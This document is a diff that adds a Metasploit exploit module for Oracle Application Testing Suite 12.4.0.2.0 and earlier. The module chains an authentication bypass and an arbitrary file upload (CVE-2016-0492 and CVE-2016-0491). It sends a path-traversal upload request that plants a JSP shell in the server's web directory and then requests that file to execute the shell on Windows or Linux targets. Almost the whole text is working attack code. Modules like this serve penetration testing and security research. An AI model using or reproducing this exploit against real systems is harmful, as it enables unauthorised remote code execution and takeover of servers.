@@ -1,0 +1,115 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Oracle ATS Arbitrary File Upload',
+      'Description'    => %q{
+        This module exploits an authentication bypass and arbitrary file upload
+        in Oracle Application Testing Suite (OATS), version 12.4.0.2.0 and
+        unknown earlier versions, to upload and execute a JSP shell.
+      },
+      'Author'         => [
+        'Zhou Yu', # Proof of concept
+        'wvu'      # Metasploit module
+      ],
+      'References'     => [
+        %w{CVE 2016-0492}, # Auth bypass
+        %w{CVE 2016-0491}, # File upload
+        %w{EDB 39691}      # PoC
+      ],
+      'DisclosureDate' => 'Jan 20 2016',
+      'License'        => MSF_LICENSE,
+      'Platform'       => %w{win linux},
+      'Arch'           => ARCH_JAVA,
+      'Privileged'     => true,
+      'Targets'        => [
+        ['OATS <= 12.4.0.2.0 (Windows)', 'Platform' => 'win'],
+        ['OATS <= 12.4.0.2.0 (Linux)',   'Platform' => 'linux']
+      ],
+      'DefaultTarget'  => 0
+    ))
+
+    register_options([
+      Opt::RPORT(8088)
+    ])
+  end
+
+  def check
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri'    => '/admin/Login.do'
+    )
+
+    if res && res.body.include?('12.4.0.2.0')
+      CheckCode::Appears
+    else
+      CheckCode::Safe
+    end
+  end
+
+  def exploit
+    print_status("Uploading JSP shell to #{jsp_path}")
+    upload_jsp_shell
+    print_status("Executing JSP shell: #{full_uri}olt/pages/#{jsp_filename}")
+    exec_jsp_shell
+  end
+
+  def upload_jsp_shell
+    mime = Rex::MIME::Message.new
+    mime.add_part('.jsp', nil, nil, 'form-data; name="storage.extension"')
+    mime.add_part(jsp_filename, nil, nil, 'form-data; name="fileName1"')
+    mime.add_part('', nil, nil, 'form-data; name="fileName2"') # Not needed
+    mime.add_part('', nil, nil, 'form-data; name="fileName3"') # Not needed
+    mime.add_part('', nil, nil, 'form-data; name="fileName4"') # Not needed
+    mime.add_part('*', nil, nil, 'form-data; name="fileType"')
+    mime.add_part(payload.encoded, 'text/plain', nil,
+                  %Q{form-data; name="file1"; filename="#{jsp_filename}"})
+    mime.add_part('Default', nil, nil, 'form-data; name="storage.repository"')
+    mime.add_part('.', nil, nil, 'form-data; name="storage.workspace"')
+    mime.add_part(jsp_directory, nil, nil, 'form-data; name="directory"')
+
+    register_files_for_cleanup(jsp_path)
+
+    send_request_cgi(
+      'method' => 'POST',
+      'uri'    => '/olt/Login.do/../../olt/UploadFileUpload.do',
+      'ctype'  => "multipart/form-data; boundary=#{mime.bound}",
+      'data'   => mime.to_s
+    )
+  end
+
+  def exec_jsp_shell
+    send_request_cgi(
+      'method' => 'GET',
+      'uri'    => "/olt/pages/#{jsp_filename}"
+    )
+  end
+
+  def jsp_directory
+    case target['Platform']
+    when 'win'
+      '..\\oats\\servers\\AdminServer\\tmp\\_WL_user\\oats_ee\\1ryhnd\\war\\pages'
+    when 'linux'
+      '../oats/servers/AdminServer/tmp/_WL_user/oats_ee/1ryhnd/war/pages'
+    end
+  end
+
+  def jsp_filename
+    @jsp_filename ||= Rex::Text.rand_text_alpha(8) + '.jsp'
+  end
+
+  def jsp_path
+    jsp_directory + "#{target['Platform'] == 'win' ? '\\' : '/'}" + jsp_filename
+  end
+
+end
